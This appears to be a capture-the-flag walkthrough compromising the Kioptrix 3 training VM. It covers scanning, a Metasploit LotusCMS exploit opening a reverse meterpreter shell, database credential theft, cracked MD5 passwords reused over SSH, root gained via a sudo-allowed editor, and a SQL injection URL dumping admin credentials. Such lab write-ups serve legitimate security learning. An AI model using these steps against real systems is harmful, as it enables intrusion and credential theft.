Reconnaissance:

Started by finding the host on the network.

nmap -sS -O 192.168.118.0/24

192.168.118.182 looks guilty.

Enumeration:

root@kali:~# nmap -A -T4 192.168.118.182

Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-19 11:08 MDT
Nmap scan report for 192.168.118.182
Host is up (0.00045s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey:
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Ligoat Security - Got Goat? Security ...
MAC Address: 00:0C:29:55:07:4C (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.45 ms 192.168.118.182

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.37 seconds

root@kali:~# dirb http://192.168.118.182/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri May 19 11:11:17 2017
URL_BASE: http://192.168.118.182/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.118.182/ ----
==> DIRECTORY: http://192.168.118.182/cache/                                                                           
==> DIRECTORY: http://192.168.118.182/core/                                                                            
+ http://192.168.118.182/data (CODE:403|SIZE:326)                                                                      
+ http://192.168.118.182/favicon.ico (CODE:200|SIZE:23126)                                                             
==> DIRECTORY: http://192.168.118.182/gallery/                                                                         
+ http://192.168.118.182/index.php (CODE:200|SIZE:1819)                                                                
==> DIRECTORY: http://192.168.118.182/modules/                                                                         
==> DIRECTORY: http://192.168.118.182/phpmyadmin/                                                                      
+ http://192.168.118.182/server-status (CODE:403|SIZE:335)                                                             
==> DIRECTORY: http://192.168.118.182/style/                                                                           

---- Entering directory: http://192.168.118.182/cache/ ----
+ http://192.168.118.182/cache/index.html (CODE:200|SIZE:1819)                                                         

---- Entering directory: http://192.168.118.182/core/ ----
==> DIRECTORY: http://192.168.118.182/core/controller/                                                                 
+ http://192.168.118.182/core/index.php (CODE:200|SIZE:0)                                                              
==> DIRECTORY: http://192.168.118.182/core/lib/                                                                        
==> DIRECTORY: http://192.168.118.182/core/model/                                                                      
==> DIRECTORY: http://192.168.118.182/core/view/                                                                       

---- Entering directory: http://192.168.118.182/gallery/ ----
+ http://192.168.118.182/gallery/index.php (CODE:500|SIZE:5650)                                                        
==> DIRECTORY: http://192.168.118.182/gallery/photos/                                                                  
==> DIRECTORY: http://192.168.118.182/gallery/themes/                                                                  

---- Entering directory: http://192.168.118.182/modules/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.182/phpmyadmin/ ----
+ http://192.168.118.182/phpmyadmin/favicon.ico (CODE:200|SIZE:18902)                                                  
+ http://192.168.118.182/phpmyadmin/index.php (CODE:200|SIZE:8136)                                                     
==> DIRECTORY: http://192.168.118.182/phpmyadmin/js/                                                                   
==> DIRECTORY: http://192.168.118.182/phpmyadmin/lang/                                                                 
+ http://192.168.118.182/phpmyadmin/libraries (CODE:403|SIZE:342)                                                      
+ http://192.168.118.182/phpmyadmin/phpinfo.php (CODE:200|SIZE:0)                                                      
==> DIRECTORY: http://192.168.118.182/phpmyadmin/scripts/                                                              
==> DIRECTORY: http://192.168.118.182/phpmyadmin/themes/                                                               

---- Entering directory: http://192.168.118.182/style/ ----
+ http://192.168.118.182/style/admin.php (CODE:200|SIZE:356)                                                           
+ http://192.168.118.182/style/index.php (CODE:200|SIZE:0)                                                             

---- Entering directory: http://192.168.118.182/core/controller/ ----
+ http://192.168.118.182/core/controller/index.php (CODE:200|SIZE:0)                                                   

---- Entering directory: http://192.168.118.182/core/lib/ ----
+ http://192.168.118.182/core/lib/index.php (CODE:200|SIZE:0)                                                          

---- Entering directory: http://192.168.118.182/core/model/ ----
+ http://192.168.118.182/core/model/index.php (CODE:200|SIZE:0)                                                        

---- Entering directory: http://192.168.118.182/core/view/ ----
+ http://192.168.118.182/core/view/index.php (CODE:200|SIZE:0)                                                         

---- Entering directory: http://192.168.118.182/gallery/photos/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.182/gallery/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.182/phpmyadmin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.182/phpmyadmin/lang/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.182/phpmyadmin/scripts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.182/phpmyadmin/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Fri May 19 11:11:36 2017
DOWNLOADED: 46120 - FOUND: 17
root@kali:~#




Hitting the webpage shows goats and a login page.  The login page is powered by LotusCMS.  Lets fireup Metasploit and use the precanned exploit.

msf > use exploit/multi/http/lcms_php_exec
msf exploit(lcms_php_exec) > show options

Module options (exploit/multi/http/lcms_php_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                     yes       The target address
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   URI      /lcms/           yes       URI
   VHOST                     no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic LotusCMS 3.0


msf exploit(lcms_php_exec) > set rhost 192.168.118.182
rhost => 192.168.118.182
msf exploit(lcms_php_exec) > set uri /
uri => /
msf exploit(lcms_php_exec) > set payload php/meterpreter/reverse_tcp
msf exploit(lcms_php_exec) > run

[*] Started reverse TCP handler on 192.168.118.180:4444
[*] Using found page param: /index.php?page=index
[*] Sending exploit ...
[*] Sending stage (33986 bytes) to 192.168.118.182

meterpreter >

Time to poke around on the machine and see what we can find.

uname -r
2.6.24-24-server

cat /proc/version
Linux version 2.6.24-24-server (buildd@palmer) (gcc version 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) #1 SMP Tue Jul 7 20:21:17 UTC 2009

dpkg --get-selections | grep deinstall
libx11-6					deinstall
libxau6						deinstall
libxcb-xlib0					deinstall
libxcb1						deinstall
libxdmcp6					deinstall
x11-common					deinstall
xinit						deinstall

Nothing super interesting or a red flag.  The website isn't in /var/www/html, lets take a look at the apache config and see where it is at.

cd /etc/apache2/sites-enabled
ls
000-default
kioptrix3.com
cat kioptrix3.com
<VirtualHost :80>
        ServerName  www.kioptrix3.com
        DocumentRoot /home/www/kioptrix3.com
</VirtualHost>

Lets poke around that directory a bit.  The Lotus CMS is nothing but flat files...nothing cool.  The gallery webapp looks interesting.  

/home/www/kioptrix3.com/gallery

they were nice enough to leave behind the install.BAK file.  From looking at that the config is in the file gconfig.php

meterpreter > cat gconfig.php

***snip***

	$GLOBALS["gallarific_path"] = "http://kioptrix3.com/gallery";

	$GLOBALS["gallarific_mysql_server"] = "localhost";
	$GLOBALS["gallarific_mysql_database"] = "gallery";
	$GLOBALS["gallarific_mysql_username"] = "root";
	$GLOBALS["gallarific_mysql_password"] = "fuckeyou";

***snip***

Let's make this shell a bit more useable before poking at mysql.

python -c 'import pty;pty.spawn("/bin/sh")'

$ mysql -u root -p
mysql -u root -p
Enter password: fuckeyou

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 50
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| gallery            |
| mysql              |
+--------------------+
3 rows in set (0.01 sec)

mysql>

mysql> use gallery;
use gallery;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+----------------------+
| Tables_in_gallery    |
+----------------------+
| dev_accounts         |
| gallarific_comments  |
| gallarific_galleries |
| gallarific_photos    |
| gallarific_settings  |
| gallarific_stats     |
| gallarific_users     |
+----------------------+
7 rows in set (0.00 sec)

mysql> SELECT * FROM dev_accounts;
SELECT * FROM dev_accounts;
+----+------------+----------------------------------+
| id | username   | password                         |
+----+------------+----------------------------------+
|  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 |
|  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e |
+----+------------+----------------------------------+
2 rows in set (0.00 sec)

Think those are simple MD5 hashes?  http://www.md5online.org/

Yep!

dreg -> Mast3r
loneferret -> starwars

Wonder if.....

root@kali:~# ssh loneferret@192.168.118.182
The authenticity of host '192.168.118.182 (192.168.118.182)' can't be established.
RSA key fingerprint is SHA256:NdsBnvaQieyTUKFzPjRpTVK6jDGM/xWwUi46IR/h1jU.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.118.182' (RSA) to the list of known hosts.
loneferret@192.168.118.182's password:
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/****/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
loneferret@Kioptrix3:~$

Yep!  Same login.

loneferret@Kioptrix3:/usr/local/bin$ cat /home/loneferret/CompanyPolicy.README
Hello new employee,
It is company policy here to use our newly installed software for editing, creating and viewing files.
Please use the command 'sudo ht'.
Failure to do so will result in you immediate termination.

DG
CEO

Wonder what this ht command is, it is trying to open a terminal.

loneferret@Kioptrix3:~$ ht
Error opening terminal: xterm-256color

strings shows me HT 2.0.18 and http://hte.sourceforge.net/

root@kali:~# searchsploit 2.0.18

HT Editor 2.0.18 - File Opening Stack Overflow | linux/local/17083.pl

Look at that...and I can run this file as root.

Serve up the file for the target machine

root@kali:~# nc -lvp 80 < /usr/share/exploitdb/platforms/linux/local/17083.pl

Grab the file and rename it

loneferret@Kioptrix3:~$ wget 192.168.118.180
loneferret@Kioptrix3:~$ mv index.html 17083.pl

Fixing the term issue before playing with HT

export TERM=xterm-color

Wait.....HT is a text editor...that I can run as root with su.  I don't need to make an exploit work...I can edit the sudoers file.

loneferret@Kioptrix3:~$ sudo ht
loneferret@Kioptrix3:~$ sudo su
root@Kioptrix3:/home/loneferret#

root@Kioptrix3:~# cat Congrats.txt
Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasn't that bad now was it.

Went in a different direction with this VM. Exploit based challenges are
nice. Helps workout that information gathering part, but sometimes we
need to get our hands dirty in other things as well.
Again, these VMs are beginner and not intented for everyone.
Difficulty is relative, keep that in mind.

The object is to learn, do some research and have a little (legal)
fun in the process.


I hope you enjoyed this third challenge.

Steven McElrea
aka loneferret
http://www.kioptrix.com


Credit needs to be given to the creators of the gallery webapp and CMS used
for the building of the Kioptrix VM3 site.

Main page CMS:
http://www.lotuscms.org

Gallery application:
Gallarific 2.1 - Free Version released October 10, 2009
http://www.gallarific.com
Vulnerable version of this application can be downloaded
from the Exploit-DB website:
http://www.exploit-db.com/exploits/15891/

The HT Editor can be found here:
http://hte.sourceforge.net/downloads.html
And the vulnerable version on Exploit-DB here:
http://www.exploit-db.com/exploits/17083/


Also, all pictures were taken from Google Images, so being part of the
public domain I used them.

root@Kioptrix3:~#


I didn't play with Gallarific at all.  The exploit is simple injection.

kioptrix3.com/gallery.php?id=null+and+1=2+union+select+1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6+from+gallarific_users--

1:admin:n0t7t1k4
